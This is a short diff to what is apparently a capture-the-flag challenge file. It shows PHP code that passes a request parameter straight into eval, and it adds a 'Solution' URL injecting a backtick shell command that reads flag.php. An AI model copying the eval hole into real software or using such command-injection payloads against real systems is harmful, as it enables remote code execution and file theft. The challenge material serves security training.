@@ -7,3 +7,6 @@ $a = @$_REQUEST['hello'];
 eval("var_dump($a);");
 
 ?>
+
+Solution
+http://evaluation.web1.sunshinectf.org/?hello=`cat%20flag.php`
